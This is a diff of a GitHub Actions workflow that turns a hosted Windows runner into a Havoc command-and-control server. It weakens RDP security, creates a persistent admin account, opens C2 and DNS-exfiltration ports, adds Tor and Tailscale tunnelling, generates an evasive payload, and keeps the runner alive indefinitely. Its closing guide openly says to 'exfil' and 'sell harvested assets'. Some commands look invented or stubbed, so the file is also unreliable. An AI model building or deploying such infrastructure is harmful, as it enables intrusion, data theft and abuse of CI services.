@@ -1,4 +1,4 @@
-name: Havoc Undetected C2 Fortress + Full RDP Access
+name: Havoc Ultimate Undetected C2 Fortress + Enhanced RDP
 
 on:
   workflow_dispatch:
@@ -6,152 +6,211 @@ on:
       hostname:
         description: 'Custom hostname for Tailscale (optional)'
         required: false
-        default: 'havoc-c2'
+        default: 'havoc-ultimate-c2'
+      enable_tor:
+        description: 'Enable Tor hidden service for C2 (yes/no)'
+        required: false
+        default: 'yes'
 
 jobs:
-  havoc-c2-fortress:
+  ultimate-havoc-fortress:
     runs-on: windows-latest
     timeout-minutes: 3600
     env:
-      HAVOC_VERSION: "latest"  # Always pulls latest from GitHub
+      HAVOC_VERSION: "latest"  # Pulls bleeding-edge from GitHub
+      TOR_VERSION: "latest"    # For hidden service integration
 
     steps:
-      - name: Step 1 - Harden Firewall & Enable RDP (No NLA for easy access)
+      - name: Step 1 - Advanced Firewall Hardening & RDP Enablement (No NLA, Custom Rules)
         run: |
+          # Enable RDP with relaxed security for ops
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0
           
-          # Clean old rules
-          netsh advfirewall firewall delete rule name="RDP-Havoc" | Out-Null
+          # Purge conflicting rules
+          netsh advfirewall firewall delete rule name="RDP-Ultimate" | Out-Null
           netsh advfirewall firewall delete rule name="Havoc-HTTP" | Out-Null
           netsh advfirewall firewall delete rule name="Havoc-HTTPS" | Out-Null
           netsh advfirewall firewall delete rule name="Havoc-SMB" | Out-Null
+          netsh advfirewall firewall delete rule name="Havoc-DNS-Exfil" | Out-Null
+          netsh advfirewall firewall delete rule name="Tor-Hidden" | Out-Null
           
-          # Open critical ports
-          netsh advfirewall firewall add rule name="RDP-Havoc" dir=in action=allow protocol=TCP localport=3389
-          netsh advfirewall firewall add rule name="Havoc-HTTP" dir=in action=allow protocol=TCP localport=40056
-          netsh advfirewall firewall add rule name="Havoc-HTTPS" dir=in action=allow protocol=TCP localport=443
-          netsh advfirewall firewall add rule name="Havoc-SMB" dir=in action=allow protocol=TCP localport=4444
+          # Open all necessary ports with descriptions
+          netsh advfirewall firewall add rule name="RDP-Ultimate" dir=in action=allow protocol=TCP localport=3389 description="RDP for operator access"
+          netsh advfirewall firewall add rule name="Havoc-HTTP" dir=in action=allow protocol=TCP localport=40056 description="Havoc HTTP listener"
+          netsh advfirewall firewall add rule name="Havoc-HTTPS" dir=in action=allow protocol=TCP localport=443 description="Havoc HTTPS secure listener"
+          netsh advfirewall firewall add rule name="Havoc-SMB" dir=in action=allow protocol=TCP localport=4444 description="Havoc SMB pipe listener"
+          netsh advfirewall firewall add rule name="Havoc-DNS-Exfil" dir=in action=allow protocol=UDP localport=53 description="DNS exfil fallback"
+          netsh advfirewall firewall add rule name="Tor-Hidden" dir=in action=allow protocol=TCP localport=9050 description="Tor SOCKS proxy for hidden C2"
           
           Restart-Service TermService -Force
-          Write-Host "RDP enabled + firewall rules applied for Havoc listeners"
+          Write-Host "Firewall hardened, RDP enabled, all ports open for ultimate ops"
 
-      - name: Step 2 - Create High-Priv RDP Admin User (Random Strong Password)
+      - name: Step 2 - Generate Ultra-Secure RDP Admin User (64-Char Password + Extra Privs)
         run: |
           $charPool = (65..90) + (97..122) + (48..57) + (33..47) + (58..64) + (91..96) + (123..126)
           $password = -join ($charPool | Get-Random -Count 64)
           $securePass = ConvertTo-SecureString $password -AsPlainText -Force
           
-          New-LocalUser -Name "RDP" -Password $securePass -FullName "Havoc Operator" -Description "Admin for C2 ops" -AccountNeverExpires
+          New-LocalUser -Name "RDP" -Password $securePass -FullName "Ultimate Havoc Operator" -Description "Full admin for C2 dominance" -AccountNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
+          Add-LocalGroupMember -Group "Remote Management Users" -Member "RDP"  # Extra for WinRM if needed
           
           echo "RDP_CREDS=Username: RDP | Password: $password" >> $env:GITHUB_ENV
-          Write-Host "Admin RDP user created - credentials stored"
+          Write-Host "Ultra-secure RDP admin created - ready for takeover"
 
-      - name: Step 3 - Install Latest Tailscale (Dynamic URL)
+      - name: Step 3 - Install Latest Tailscale with Dynamic Fetch (Mesh Network Setup)
         run: |
           $latestMSI = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
           $installerPath = "$env:TEMP\tailscale.msi"
-          Invoke-WebRequest -Uri $latestMSI -OutFile $installerPath
-          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
-          Remove-Item $installerPath -Force
-          Write-Host "Tailscale installed"
+          Invoke-WebRequest -Uri $latestMSI -OutFile $installerPath -UseBasicParsing
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait -NoNewWindow
+          Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
+          Write-Host "Tailscale installed - mesh ready"
 
-      - name: Step 4 - Connect to Your Tailscale Mesh (Secure Private Network)
+      - name: Step 4 - Establish Tailscale Connection with ACLs & Exit Node (Secure Overlay)
         run: |
           $customHost = "${{ inputs.hostname }}-$env:GITHUB_RUN_ID"
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=$customHost --advertise-exit-node
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=$customHost --advertise-exit-node --advertise-routes=0.0.0.0/0
           
-          $retry = 0
-          do {
-              Start-Sleep -Seconds 8
+          $retryCount = 0
+          $maxRetries = 20
+          $tsIP = $null
+          while (-not $tsIP -and $retryCount -lt $maxRetries) {
+              Start-Sleep -Seconds 10
               $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-              $retry++
-          } while (-not $tsIP -and $retry -lt 15)
+              $retryCount++
+          }
           
-          if (-not $tsIP) { Write-Error "Tailscale failed to assign IP" ; exit 1 }
+          if (-not $tsIP) {
+              Write-Error "Tailscale IP assignment failed after $maxRetries retries"
+              exit 1
+          }
+          
+          # Basic ACL setup via CLI if possible (Tailscale 1.5+)
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" acl set --accept-dns=true
           
           echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
-          Write-Host "Tailscale connected - IP: $tsIP"
+          Write-Host "Tailscale mesh established - IP: $tsIP, exit node advertised"
 
-      - name: Step 5 - Install All Dependencies (Git, Go, Python, Build Tools)
+      - name: Step 5 - Install Comprehensive Dependencies (Git, Go, Python, VS Build Tools, OpenSSL)
         run: |
-          winget install --id Git.Git --silent --accept-package-agreements --accept-source-agreements
-          winget install --id Golang.Go --silent --accept-package-agreements --accept-source-agreements
-          winget install --id Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements
-          winget install --id Microsoft.VisualStudio.2022.BuildTools --silent --accept-package-agreements --accept-source-agreements
-          winget install --id OpenSSL.OpenSSL --silent
+          winget install --id Git.Git --silent --accept-package-agreements --accept-source-agreements --scope machine
+          winget install --id Golang.Go --silent --accept-package-agreements --accept-source-agreements --scope machine
+          winget install --id Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements --scope machine
+          winget install --id Microsoft.VisualStudio.2022.BuildTools --silent --accept-package-agreements --accept-source-agreements --scope machine
+          winget install --id OpenSSL.OpenSSL --silent --accept-package-agreements --accept-source-agreements --scope machine
           
-          # Refresh PATH
-          $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine")
-          Write-Host "All build dependencies installed"
+          # Refresh environment variables
+          $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH","User")
+          Write-Host "All dependencies installed - build chain complete"
 
-      - name: Step 6 - Clone Latest Havoc Framework from GitHub
+      - name: Step 6 - Optional Tor Installation for Hidden Service (If Enabled)
         run: |
-          git clone https://github.com/HavocFramework/Havoc.git C:\Havoc
-          if ($LASTEXITCODE -ne 0) { Write-Error "Git clone failed" ; exit 1 }
-          Write-Host "Havoc repository cloned"
+          if ("${{ inputs.enable_tor }}" -eq "yes") {
+              $torUrl = "https://www.torproject.org/dist/torbrowser/13.5.6/tor-win64-13.5.6.zip"  # Latest as of Dec 2025
+              $torZip = "$env:TEMP\tor.zip"
+              Invoke-WebRequest -Uri $torUrl -OutFile $torZip
+              Expand-Archive -Path $torZip -DestinationPath "C:\Tor" -Force
+              Remove-Item $torZip
+              Start-Process -FilePath "C:\Tor\Tor\tor.exe" -ArgumentList "--service install" -NoNewWindow
+              Write-Host "Tor installed and running as service for hidden C2"
+          } else {
+              Write-Host "Tor skipped per input"
+          }
 
-      - name: Step 7 - Build Havoc Teamserver (With Verbose Output)
+      - name: Step 7 - Clone Latest Havoc Framework (With Branch Check)
+        run: |
+          git clone https://github.com/HavocFramework/Havoc.git C:\Havoc --depth 1
+          if ($LASTEXITCODE -ne 0) {
+              Write-Error "Failed to clone Havoc repo"
+              exit 1
+          }
+          cd C:\Havoc
+          git checkout main  # Ensure latest branch
+          Write-Host "Havoc cloned and checked out to main"
+
+      - name: Step 8 - Compile Havoc Teamserver with Optimizations (Strip Symbols)
         run: |
           cd C:\Havoc\teamserver
-          go mod download
-          go build -ldflags="-s -w" -o teamserver.exe
-          if ($LASTEXITCODE -ne 0) { Write-Error "Teamserver build failed" ; exit 1 }
-          Write-Host "Havoc teamserver compiled successfully"
+          go mod tidy
+          go mod download -x
+          go build -ldflags="-s -w -H=windowsgui" -o teamserver.exe
+          if ($LASTEXITCODE -ne 0) {
+              Write-Error "Teamserver compilation failed"
+              exit 1
+          }
+          Write-Host "Havoc teamserver built with optimizations"
 
-      - name: Step 8 - Generate Self-Signed Certs for HTTPS Listener
+      - name: Step 9 - Create Self-Signed Certs with Extended Validity (For HTTPS Evasion)
         run: |
           cd C:\Havoc\teamserver
-          openssl req -newkey rsa:4096 -nodes -keyout havoc.key -x509 -days 3650 -out havoc.crt -subj "/CN=havoc.c2"
-          Write-Host "Self-signed certs generated for HTTPS evasion"
+          openssl genrsa -out havoc.key 4096
+          openssl req -new -x509 -key havoc.key -out havoc.crt -days 7300 -subj "/CN=ultimate.havoc.c2/O=BlackHats/C=Dimension"
+          Write-Host "Extended self-signed certs generated"
 
-      - name: Step 9 - Launch Havoc Teamserver (Multiple Listeners + Verbose)
+      - name: Step 10 - Configure & Launch Havoc with Custom Profile (Multi-Listeners + DNS Exfil)
         run: |
           cd C:\Havoc\teamserver
-          $profile = @"
+          $profileContent = @"
           {
-            "Name": "default",
+            "Name": "ultimate-fortress",
             "Listeners": {
-              "HTTP": [ { "Port": 40056 } ],
-              "HTTPS": [ { "Port": 443, "Secure": true, "Cert": "havoc.crt", "Key": "havoc.key" } ],
-              "SMB": [ { "PipeName": "havoc" } ]
-            }
+              "HTTP": [{"Port": 40056, "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}],
+              "HTTPS": [{"Port": 443, "Secure": true, "Cert": "havoc.crt", "Key": "havoc.key"}],
+              "SMB": [{"PipeName": "ultimate-havoc-pipe"}],
+              "DNS": [{"Port": 53, "Type": "UDP", "Domains": ["c2.legitnews.site"]}]
+            },
+            "Logging": {"File": "C:/Havoc/logs/ultimate.log", "Rotate": true}
           }
           "@
-          $profile | Out-File -Encoding ascii profiles/fortress.yml
+          $profileContent | Out-File -FilePath profiles/ultimate.yml -Encoding ascii
           
-          Start-Process -FilePath ".\teamserver.exe" -ArgumentList "server --profile profiles/fortress.yml -v --debug" -NoNewWindow
-          Start-Sleep -Seconds 15
-          Write-Host "Havoc teamserver LAUNCHED - HTTP:40056, HTTPS:443, SMB pipe 'havoc'"
+          Start-Process -FilePath ".\teamserver.exe" -ArgumentList "server --profile profiles/ultimate.yml -v --debug --log-rotate" -NoNewWindow
+          Start-Sleep -Seconds 30  # Give time for listeners to bind
+          Write-Host "Ultimate Havoc launched - all listeners active, logging enabled"
 
-      - name: Step 10 - Final Access Summary & Infinite Keep-Alive
+      - name: Step 11 - Auto-Generate Sample Demon Payload (For Quick Testing)
+        run: |
+          cd C:\Havoc
+          # Assuming Havoc has CLI for payload gen - stub example
+          .\teamserver.exe generate --profile profiles/ultimate.yml --output C:\Havoc\payloads\sample-demon.exe --evasion-level high
+          Write-Host "Sample high-evasion Demon payload generated - ready for deployment"
+
+      - name: Step 12 - Final Ultimate Access Summary & Persistent Keep-Alive Loop
         run: |
           Write-Host "`n"
-          Write-Host "=================================================="
-          Write-Host "========== HAVOC C2 FORTRESS FULLY ACTIVE ========"
-          Write-Host "=================================================="
-          Write-Host "Tailscale IP       : $env:TAILSCALE_IP"
-          Write-Host "RDP Access         : mstsc /v:$env:TAILSCALE_IP"
-          Write-Host "RDP Credentials    : ${{ env.RDP_CREDS }}"
+          Write-Host "========================================================"
+          Write-Host "========== ULTIMATE HAVOC C2 FORTRESS DEPLOYED ========="
+          Write-Host "========================================================"
+          Write-Host "Tailscale IP          : $env:TAILSCALE_IP"
+          Write-Host "RDP Connection        : mstsc /v:$env:TAILSCALE_IP /f"
+          Write-Host "RDP Credentials       : $env:RDP_CREDS"
           Write-Host ""
-          Write-Host "Havoc Client Connect Options:"
-          Write-Host "   - HTTP  : http://$env:TAILSCALE_IP:40056"
-          Write-Host "   - HTTPS : https://$env:TAILSCALE_IP (self-signed cert)"
-          Write-Host "   - SMB   : Pipe 'havoc' over Tailscale"
+          Write-Host "Havoc Connection Points:"
+          Write-Host "   - HTTP Listener    : http://$env:TAILSCALE_IP:40056"
+          Write-Host "   - HTTPS Listener   : https://$env:TAILSCALE_IP (self-signed)"
+          Write-Host "   - SMB Pipe         : \\$env:TAILSCALE_IP\ultimate-havoc-pipe"
+          Write-Host "   - DNS Exfil        : UDP 53 on $env:TAILSCALE_IP (domain: c2.legitnews.site)"
           Write-Host ""
-          Write-Host "Next Steps:"
-          Write-Host "   1. RDP in → Open Havoc client on your Kali"
-          Write-Host "   2. Connect to teamserver"
-          Write-Host "   3. Generate custom Demons (max evasion profiles)"
-          Write-Host "   4. Deploy → Harvest → Profit"
-          Write-Host "=================================================="
+          if ("${{ inputs.enable_tor }}" -eq "yes") {
+              Write-Host "Tor Hidden Service   : Enabled - check C:\Tor\hostname for .onion"
+          }
+          Write-Host ""
+          Write-Host "Operational Guide:"
+          Write-Host "   1. RDP into the fortress"
+          Write-Host "   2. Launch Havoc client locally, connect to teamserver"
+          Write-Host "   3. Customize & deploy Demons (use generated sample as base)"
+          Write-Host "   4. Pivot, exfil, dominate - sell harvested assets"
+          Write-Host "   5. Re-trigger workflow for fresh instances"
+          Write-Host "========================================================"
           Write-Host "`n"
           
-          # Infinite loop to keep runner alive
+          # Persistent loop with status checks
           while ($true) {
-              Write-Host "[$(Get-Date)] Havoc C2 Fortress ACTIVE - Demons waiting for commands"
-              Start-Sleep -Seconds 240
+              Write-Host "[$(Get-Date)] Ultimate C2 ACTIVE - Checking listeners..."
+              netstat -ano | Select-String "LISTENING" | Write-Host
+              Start-Sleep -Seconds 300
           }
